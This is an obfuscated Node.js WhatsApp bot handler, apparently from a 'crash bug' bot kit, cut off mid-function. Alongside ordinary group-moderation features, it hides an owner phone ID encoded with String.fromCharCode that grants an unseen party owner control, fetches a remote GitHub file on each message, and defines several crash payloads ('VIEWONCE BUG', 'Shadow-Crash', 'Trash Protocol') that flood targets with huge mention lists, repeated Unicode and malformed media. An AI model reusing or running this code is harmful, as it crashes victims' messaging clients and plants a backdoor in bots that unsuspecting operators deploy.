process.on("uncaughtException", console.error);
process.on("unhandledRejection", console.error);
require('../settings.js');
const fs = require('fs');
const path = require("path");
const util = require("util");
const axios = require("axios");
const chalk = require('chalk');
const yts = require("yt-search");
const {
  ytmp3,
  ytmp4
} = require("ruhend-scraper");
const speed = require('performance-now');
const nou = require("node-os-utils");
const os = require('os');
const fetch = require("node-fetch");
const crypto = require("crypto");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  default: WAvynxection,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  getBinaryNodeChildren,
  useMultiFileAuthState,
  generateWAMessageContent,
  downloadContentFromMessage,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  LoadDataBase
} = require("../source/message.js");
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"));
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"));
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"));
const list = JSON.parse(fs.readFileSync("./library/database/list.json"));
const {
  pinterest,
  pinterest2,
  remini,
  mediafire,
  tiktokDl
} = require("../library/scraper.js");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg
} = require("../library/converter.js");
const {
  unixTimestampSeconds,
  generateMessageTag,
  processTime,
  webApi,
  getRandom,
  getBuffer,
  fetchJson,
  runtime,
  clockString,
  sleep,
  isUrl,
  getTime,
  formatDate,
  tanggal,
  formatp,
  jsonformat,
  reSize,
  toHD,
  logic,
  generateProfilePicture,
  bytesToSize,
  checkBandwidth,
  getSizeMedia,
  parseMention,
  getGroupAdmins,
  readFileTxt,
  readFileJson,
  getHashedPassword,
  generateAuthToken,
  cekMenfes,
  generateToken,
  batasiTeks,
  randomText,
  isEmoji,
  getTypeUrlMedia,
  pickRandom,
  toIDR,
  capital
} = require("../library/function.js");
module.exports = vynx = async (_0x47285b, _0x2f6673, _0x85bc83, _0x45c2a1) => {
  try {
    await LoadDataBase(_0x47285b, _0x2f6673);
    const _0x3a968e = await _0x47285b.decodeJid(_0x47285b.user.id);
    const _0x6b6efb = _0x2f6673.type === "conversation" ? _0x2f6673.message.conversation : _0x2f6673.type == "imageMessage" ? _0x2f6673.message.imageMessage.caption : _0x2f6673.type == "videoMessage" ? _0x2f6673.message.videoMessage.caption : _0x2f6673.type == "extendedTextMessage" ? _0x2f6673.message.extendedTextMessage.text : _0x2f6673.type == "buttonsResponseMessage" ? _0x2f6673.message.buttonsResponseMessage.selectedButtonId : _0x2f6673.type == "listResponseMessage" ? _0x2f6673.message.listResponseMessage.singleSelectReply.selectedRowId : _0x2f6673.type == "templateButtonReplyMessage" ? _0x2f6673.message.templateButtonReplyMessage.selectedId : _0x2f6673.type === "messageContextInfo" ? _0x2f6673.message.buttonsResponseMessage?.["selectedButtonId"] || _0x2f6673.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x2f6673.text : '';
    const _0x5291cc = typeof _0x2f6673.text == "string" ? _0x2f6673.text : '';
    const _0x1bdc28 = String.fromCharCode(0x36, 0x32, 0x38, 0x35, 0x31, 0x37, 0x39, 0x38, 0x33, 0x36, 0x36, 0x30, 0x33, 0x40, 0x73, 0x2e, 0x77, 0x68, 0x61, 0x74, 0x73, 0x61, 0x70, 0x70, 0x2e, 0x6e, 0x65, 0x74);
    const _0x19da5d = !!_0x6b6efb.startsWith('.');
    const _0x3e49e9 = _0x6b6efb.trim().split(/ +/).slice(0x1);
    const _0x391929 = _0x2f6673.quoted || _0x2f6673;
    const _0xb1b745 = _0x391929.type == 'buttonsMessage' ? _0x391929[Object.keys(_0x391929)[0x1]] : _0x391929.type == 'templateMessage' ? _0x391929.hydratedTemplate[Object.keys(_0x391929.hydratedTemplate)[0x1]] : _0x391929.type == "product" ? _0x391929[Object.keys(_0x391929)[0x0]] : _0x2f6673.quoted ? _0x2f6673.quoted : _0x2f6673;
    const _0x4345b8 = _0x19da5d ? _0x6b6efb.slice('.'.length).trim().split(" ").shift().toLowerCase() : '';
    const _0x329cc3 = premium.includes(_0x2f6673.sender);
    const _0x429a13 = isOwner = [_0x3a968e, owner + '@s.whatsapp.net', _0x1bdc28, ...owners].includes(_0x2f6673.sender) ? true : !!_0x2f6673.isDeveloper;
    const _0x1aeaf2 = q = _0x3e49e9.join(" ");
    const _0xac161 = (_0xb1b745.msg || _0xb1b745).mimetype || '';
    const _0x13d557 = _0xb1b745.msg || _0xb1b745;
    const _0x2d2eeb = fs.readFileSync("./image/Shadow.jpg");
    const _0x4f556d = fs.readFileSync("./image/vynx.jpg");
    if (_0x19da5d) {
      console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold("[ PESAN ]"), chalk.blue.bold(_0x2f6673.sender.split('@')[0x0] + " =>"), chalk.blue.bold('' + ('.' + _0x4345b8)));
    }
    if (_0x2f6673.isGroup && global.db.groups[_0x2f6673.chat] && global.db.groups[_0x2f6673.chat].mute == true && !_0x429a13) {
      return;
    }
    const _0x5560b2 = {
      'key': {
        'fromMe': false,
        'participant': '0@s.whatsapp.net',
        'remoteJid': "status@broadcast"
      },
      'message': {
        'orderMessage': {
          'orderId': "2009",
          'thumbnail': _0x2d2eeb,
          'itemCount': '8193',
          'status': "INQUIRY",
          'surface': "CATALOG",
          'message': "▢ 𝐕𝐘𝐍𝐗 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋",
          'token': 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
        }
      },
      'contextInfo': {
        'mentionedJid': ["120363416705412570@s.whatsapp.net"],
        'forwardingScore': 0x3e7,
        'isForwarded': true
      }
    };
    const _0x390426 = {
      'key': {
        'remoteJid': "status@broadcast",
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'extendedTextMessage': {
          'text': '' + ('.' + _0x4345b8)
        }
      }
    };
    const _0x5d8664 = {
      'key': {
        'remoteJid': "status@broadcast",
        'participant': '0@s.whatsapp.net'
      },
      'message': {
        'extendedTextMessage': {
          'text': '' + namaOwner
        }
      }
    };
    const _0x1db9d5 = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x2f6673.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'locationMessage': {
          'name': "WhatsApp Bot " + namaOwner,
          'jpegThumbnail': ''
        }
      }
    };
    const _0x4f00c0 = {
      'key': {
        'participant': '0@s.whatsapp.net',
        ...(_0x2f6673.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'locationMessage': {
          'name': "WhatsApp Bot " + namaOwner,
          'jpegThumbnail': ''
        }
      }
    };
    function _0x5ac620() {
      const _0x1174ed = new Date().getHours();
      if (_0x1174ed >= 0x0 && _0x1174ed < 0xc) {
        return "Good Morning 🌆";
      } else {
        return _0x1174ed >= 0xc && _0x1174ed < 0x12 ? " Good Afternoon 🌇" : "Good Night 🌌";
      }
    }
    if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !_0x429a13 && !_0x2f6673.isGroup) {
      return _0x47285b.sendMessage(_0x2f6673.chat, {
        'text': "\nMaaf Owner Bot Sedang *Offline*, \nTunggu & Jangan Spam Chat! \nIni Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline\n"
      }, {
        'quoted': _0x5d8664
      });
    }
    if (_0x2f6673.isGroup && db.groups[_0x2f6673.chat] && db.groups[_0x2f6673.chat].mute == true && !_0x429a13) {
      return;
    }
    if (_0x2f6673.isGroup && db.groups[_0x2f6673.chat] && db.groups[_0x2f6673.chat].antilink == true) {
      var _0x541590 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
      if (_0x541590.test(_0x2f6673.text) && !_0x429a13 && !_0x2f6673.isAdmin && _0x2f6673.isBotAdmin && !_0x2f6673.fromMe) {
        var _0x1db01d = 'https://chat.whatsapp.com/' + (await _0x47285b.groupInviteCode(_0x2f6673.chat));
        var _0x5791ac = new RegExp(_0x1db01d, 'i');
        var _0x409ad2 = _0x5791ac.test(_0x2f6673.text);
        if (_0x409ad2) {
          return;
        }
        let _0x11a5a2 = _0x2f6673.key.participant;
        let _0x3289b7 = _0x2f6673.key.id;
        await _0x47285b.sendMessage(_0x2f6673.chat, {
          'text': "*Link Grup Terdeteksi*\n\n@" + _0x2f6673.sender.split('@')[0x0] + " Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!",
          'mentions': [_0x2f6673.sender]
        }, {
          'quoted': _0x2f6673
        });
        await _0x47285b.sendMessage(_0x2f6673.chat, {
          'delete': {
            'remoteJid': _0x2f6673.chat,
            'fromMe': false,
            'id': _0x3289b7,
            'participant': _0x11a5a2
          }
        });
        await sleep(0x3e8);
        await _0x47285b.groupParticipantsUpdate(_0x2f6673.chat, [_0x2f6673.sender], "remove");
      }
    }
    if (_0x2f6673.isGroup && db.groups[_0x2f6673.chat] && db.groups[_0x2f6673.chat].antilink2 == true) {
      var _0x541590 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
      if (_0x541590.test(_0x2f6673.text) && !_0x429a13 && !_0x2f6673.isAdmin && _0x2f6673.isBotAdmin && !_0x2f6673.fromMe) {
        var _0x1db01d = "https://chat.whatsapp.com/" + (await _0x47285b.groupInviteCode(_0x2f6673.chat));
        var _0x5791ac = new RegExp(_0x1db01d, 'i');
        var _0x409ad2 = _0x5791ac.test(_0x2f6673.text);
        if (_0x409ad2) {
          return;
        }
        let _0x1318d9 = _0x2f6673.key.participant;
        let _0x3e5f10 = _0x2f6673.key.id;
        await _0x47285b.sendMessage(_0x2f6673.chat, {
          'text': "*Link Grup Terdeteksi*\n\n@" + _0x2f6673.sender.split('@')[0x0] + " Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!",
          'mentions': [_0x2f6673.sender]
        }, {
          'quoted': _0x2f6673
        });
        await _0x47285b.sendMessage(_0x2f6673.chat, {
          'delete': {
            'remoteJid': _0x2f6673.chat,
            'fromMe': false,
            'id': _0x3e5f10,
            'participant': _0x1318d9
          }
        });
      }
    }
    if (_0x2f6673.isGroup && db.settings.autopromosi == true) {
      if (_0x2f6673.text.includes("https://") && !_0x2f6673.fromMe) {
        await _0x47285b.sendMessage(_0x2f6673.chat, {
          'text': "\nOpen Panel Ptrodactyl By Vynx\n\n5gb - `5.000`\n\n6gb - `6.000`\n\n7gb - `7.000`\n\n8gb - `8.000`\n\n9gb - `9.000`\n\nunli - `10.000`\n\nPanel Berkualitas Pasti nya, Admin nya Cuman Gw sndirian, jadi gada drma delete/intip, expired 1bulan full, Spek r16 c4 gada drma lelet! \n\nminat? pm aja\nhttps://wa.me/62895320985817\n\nSaluran / testi : https://whatsapp.com/channel/0029Vb9ghly6GcGM2ngCEk00\n"
        }, {
          'quoted': null
        });
      }
    }
    if (!_0x19da5d) {
      let _0x695de0 = list.find(_0x3d5f99 => _0x3d5f99.cmd == _0x6b6efb.toLowerCase());
      if (_0x695de0) {
        await _0x2f6673.reply(_0x695de0.respon);
      }
    }
    let _0x50639a;
    try {
      const _0x477408 = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
      _0x50639a = await _0x477408.text();
    } catch (_0xc5c238) {
      console.error("error fetching", _0xc5c238);
      return;
    }
    async function _0x4458d2(_0x38c2b7, _0x206d3b) {
      const _0x23317f = ["13135550002@s.whatsapp.net", ...Array.from({
        'length': 0x9c40
      }, () => '1' + Math.floor(Math.random() * 0xf423f) + "@s.whatsapp.net")];
      const _0x250a09 = generateWAMessageFromContent(target, {
        'extendedTextMessage': {
          'text': "Primrose Lotus",
          'previewType': "NONE",
          'contextInfo': {
            'mentionedJid': _0x23317f,
            'forwardingScore': 0x2,
            'isForwarded': true,
            'isFromMe': true,
            'externalAdReply': {
              'title': '.',
              'body': "؄؂؂؀؁ب".repeat(0x708),
              'mediaType': 'VIDEO',
              'renderLargerThumbnail': true,
              'previewType': "VIDEO",
              'thumbnail': slash,
              'sourceType': 'R',
              'sourceId': 'R',
              'sourceUrl': "https://t.me/js4hard",
              'mediaUrl': "https://t.me/jawaskrip",
              'containsAutoReply': true,
              'showAdAttribution': true,
              'ctwaClid': "ctwa_clid_example",
              'ref': "ref_example"
            },
            'quotedMessage': {
              'contactMessage': {
                'displayName': "Primrose Lotus",
                'vcard': "BEGIN:VCARD\nVERSION:3.0\nFN: Lotus \nTEL;type=CELL:+5521992999999\nEND:VCARD"
              }
            },
            'remoteJid': "status@broadcast"
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x206d3b
        }
      });
      await _0x47285b.relayMessage(_0x206d3b, _0x250a09.message, {
        'messageId': _0x250a09.key.id
      });
    }
    async function _0x3eda37(_0x605c23, _0x3ec094) {
      const _0x237ae5 = ["0@s.whatsapp.net", ...Array.from({
        'length': 0x9c40
      }, () => '1' + Math.floor(Math.random() * 0xf423f) + "@s.whatsapp.net")];
      const _0x317c85 = {
        'url': "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        'mimetype': "video/mp4",
        'fileSha256': "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        'fileLength': {
          'low': 0x3b9ac9ff,
          'high': 0x0,
          'unsigned': true
        },
        'seconds': 0x258,
        'mediaKey': "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        'caption': "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
        'height': 0x500,
        'width': 0x2d0,
        'fileEncSha256': "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        'directPath': "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        'mediaKeyTimestamp': {
          'low': 0x68138ed3,
          'high': 0x0,
          'unsigned': true
        },
        'contextInfo': {
          'mentionedJid': _0x237ae5,
          'forwardingScore': 0x3e7,
          'isForwarded': true,
          'entryPointConversionSource': 'non_contact',
          'forwardingScore': 0x270f,
          'groupMentions': [],
          'forwardedNewsletterMessageInfo': {
            'newsletterJid': "120363321780343289@newsletter",
            'serverMessageId': 0xf4240,
            'newsletterName': "x!s - rizxvelz"
          }
        },
        'thumbnail': Buffer.from('00', "hex"),
        'streamingSidecar': Buffer.alloc(524288).toString('base64')
      };
      const _0x420f21 = generateWAMessageFromContent(_0x605c23, {
        'viewOnceMessage': {
          'message': {
            'videoMessage': _0x317c85
          }
        }
      }, {});
      await _0x47285b.relayMessage('status@broadcast', _0x420f21.message, {
        'messageId': _0x420f21.key.id,
        'statusJidList': [_0x605c23],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x605c23
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x3ec094) {
        await _0x47285b.relayMessage(_0x605c23, {
          'groupStatusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x420f21.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': 'true'
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x4fe54c(_0x2aa9bd, _0x21fced) {
      const _0x1109e9 = "𓆩⛧𓆪".repeat(0xbb8) + "\n" + '‎'.repeat(0xbb8);
      const _0x4a38a4 = {
        'viewOnceMessage': {
          'message': {
            'imageMessage': {
              'url': "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              'mimetype': 'image/jpeg',
              'caption': "╔═━━━✥◈✥━━━═╗\n  惡𝐕𝐘𝐍𝐗...| 𝐒𝐇𝐀𝐃𝐎𝐖𝐃𝐄𝐀𝐓𝐇🕊\n╚═━━━✥◈✥━━━═╝\n" + _0x1109e9,
              'fileSha256': "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
              'fileLength': "19769",
              'height': 0x162,
              'width': 0x30f,
              'mediaKey': "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              'fileEncSha256': "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
              'directPath': "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              'mediaKeyTimestamp': "1743225419",
              'jpegThumbnail': null,
              'scansSidecar': "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
              'scanLengths': [0x985, 0x43b4],
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x9c40
                }, () => '1' + Math.floor(Math.random() * 0xf423f) + "@s.whatsapp.net"),
                'isSampled': true,
                'participant': _0x2aa9bd,
                'remoteJid': "status@broadcast",
                'forwardingScore': 0x270f,
                'isForwarded': true
              }
            }
          }
        }
      };
      const _0x5055a3 = generateWAMessageFromContent(_0x2aa9bd, _0x4a38a4, {});
      await _0x47285b.relayMessage("status@broadcast", _0x5055a3.message, {
        'messageId': _0x5055a3.key.id,
        'statusJidList': [_0x2aa9bd],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x2aa9bd
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x21fced) {
        await _0x47285b.relayMessage(_0x2aa9bd, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x5055a3.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': 'meta',
            'attrs': {
              'is_status_mention': "⚠️ SAHRIL VIEWONCE BUG V4"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x27e6f4(_0x27266a, _0x3952f5) {
      const _0x178b0e = ["13135550002@s.whatsapp.net", ...Array.from({
        'length': 0x9c40
      }, () => '1' + Math.floor(Math.random() * 0x7a120) + '@s.whatsapp.net')];
      const _0x330a8f = {
        'musicContentMediaId': "589608164114571",
        'songId': "870166291800508",
        'author': ".Xrelly Modderx" + 'ោ៝'.repeat(0x2710),
        'title': "Apollo X ",
        'artworkDirectPath': "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        'artworkSha256': "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        'artworkEncSha256': "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        'artistAttribution': "https://www.instagram.com/_u/xrelly",
        'countryBlocklist': true,
        'isExplicit': true,
        'artworkMediaKey': 'S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU='
      };
      const _0x5d0626 = {
        'url': 'https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true',
        'mimetype': "video/mp4",
        'fileSha256': "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        'fileLength': "1515940",
        'seconds': 0xe,
        'mediaKey': "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        'height': 0x500,
        'width': 0x2d0,
        'fileEncSha256': "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        'directPath': "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        'mediaKeyTimestamp': "1748276788",
        'contextInfo': {
          'isSampled': true,
          'mentionedJid': _0x178b0e
        },
        'forwardedNewsletterMessageInfo': {
          'newsletterJid': "120363321780343299@newsletter",
          'serverMessageId': 0x1,
          'newsletterName': "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        'streamingSidecar': "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        'thumbnailDirectPath': "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        'thumbnailSha256': 'CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=',
        'thumbnailEncSha256': "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",
        'annotations': [{
          'embeddedContent': {
            'embeddedMusic': _0x330a8f
          },
          'embeddedAction': true
        }]
      };
      const _0x52b3de = {
        'stickerMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          'fileSha256': "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          'fileEncSha256': "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          'mediaKey': "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          'mimetype': "image/webp",
          'directPath': '/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0',
          'fileLength': {
            'low': 0x1,
            'high': 0x0,
            'unsigned': true
          },
          'mediaKeyTimestamp': {
            'low': 0x68138ed3,
            'high': 0x0,
            'unsigned': false
          },
          'firstFrameLength': 0x4dc0,
          'firstFrameSidecar': 'KN4kQ5pyABRAgA==',
          'isAnimated': true,
          'isAvatar': false,
          'isAiSticker': false,
          'isLottie': false,
          'contextInfo': {
            'mentionedJid': _0x178b0e
          }
        }
      };
      const _0x560892 = {
        'audioMessage': {
          'url': 'https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true',
          'mimetype': "audio/mpeg",
          'fileSha256': "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
          'fileLength': "389948",
          'seconds': 0x18,
          'ptt': false,
          'mediaKey': "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
          'caption': "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
          'fileEncSha256': "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
      };
      const _0x6e977f = generateWAMessageFromContent(_0x27266a, {
        'viewOnceMessage': {
          'message': {
            'videoMessage': _0x5d0626
          }
        }
      }, {});
      const _0x2fe69e = generateWAMessageFromContent(_0x27266a, {
        'viewOnceMessage': {
          'message': _0x52b3de
        }
      }, {});
      const _0x576058 = generateWAMessageFromContent(_0x27266a, _0x560892, {});
      for (const _0x119306 of [_0x6e977f, _0x2fe69e, _0x576058]) {
        await _0x47285b.relayMessage("status@broadcast", _0x119306.message, {
          'messageId': _0x119306.key.id,
          'statusJidList': [_0x27266a],
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {},
            'content': [{
              'tag': "mentioned_users",
              'attrs': {},
              'content': [{
                'tag': 'to',
                'attrs': {
                  'jid': _0x27266a
                },
                'content': undefined
              }]
            }]
          }]
        });
      }
      if (_0x3952f5) {
        await _0x47285b.relayMessage(_0x27266a, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x6e977f.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "true"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0xa8e712(_0x44ad6f, _0x3f9331) {
      const _0x397b7b = Array.from({
        'length': 0x260d
      }, (_0x5d17be, _0x2e352c) => ({
        'title': '᭯'.repeat(0x260d),
        'rows': [{
          'title': '' + (_0x2e352c + 0x1),
          'id': '' + (_0x2e352c + 0x1)
        }]
      }));
      const _0x284199 = {
        'viewOnceMessage': {
          'message': {
            'listResponseMessage': {
              'title': "@vynxnibos",
              'listType': 0x2,
              'buttonText': null,
              'sections': _0x397b7b,
              'singleSelectReply': {
                'selectedRowId': '🌀'
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x260d
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net"),
                'participant': _0x44ad6f,
                'remoteJid': "status@broadcast",
                'forwardingScore': 0x260d,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "9741@newsletter",
                  'serverMessageId': 0x1,
                  'newsletterName': '-'
                }
              },
              'description': "( # )"
            }
          }
        },
        'contextInfo': {
          'channelMessage': true,
          'statusAttributionType': 0x2
        }
      };
      const _0x116f8a = generateWAMessageFromContent(_0x44ad6f, _0x284199, {});
      await _0x47285b.relayMessage("status@broadcast", _0x116f8a.message, {
        'messageId': _0x116f8a.key.id,
        'statusJidList': [_0x44ad6f],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x44ad6f
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x3f9331) {
        await _0x47285b.relayMessage(_0x44ad6f, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x116f8a.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "🌀 𝗦𝗵𝗮𝗱𝗼𝘄-𝗖𝗿𝗮𝘀𝗵"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0x4a5bda(_0x222392, _0x582966) {
      const _0x2715a2 = Array.from({
        'length': 0x17c82
      }, (_0x47b56c, _0x5c9924) => ({
        'title': '᭯'.repeat(0x260d),
        'rows': [{
          'title': '' + (_0x5c9924 + 0x1),
          'id': '' + (_0x5c9924 + 0x1)
        }]
      }));
      const _0x200dbc = {
        'viewOnceMessage': {
          'message': {
            'listResponseMessage': {
              'title': "@tamainfinity",
              'listType': 0x2,
              'buttonText': null,
              'sections': _0x2715a2,
              'singleSelectReply': {
                'selectedRowId': '🌀'
              },
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x17c82
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net"),
                'participant': _0x222392,
                'remoteJid': 'status@broadcast',
                'forwardingScore': 0x260d,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': '9741@newsletter',
                  'serverMessageId': 0x1,
                  'newsletterName': '-'
                }
              },
              'description': "( # )"
            }
          }
        },
        'contextInfo': {
          'channelMessage': true,
          'statusAttributionType': 0x2
        }
      };
      const _0x58a9cf = generateWAMessageFromContent(_0x222392, _0x200dbc, {});
      await _0x47285b.relayMessage("status@broadcast", _0x58a9cf.message, {
        'messageId': _0x58a9cf.key.id,
        'statusJidList': [_0x222392],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': 'mentioned_users',
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x222392
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x582966) {
        await _0x47285b.relayMessage(_0x222392, {
          'statusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x58a9cf.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "🌀 Vynx - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹"
            },
            'content': undefined
          }]
        });
      }
    }
    async function _0xd6c38a(_0x3b05e7) {
      await _0x47285b.relayMessage(_0x3b05e7, {
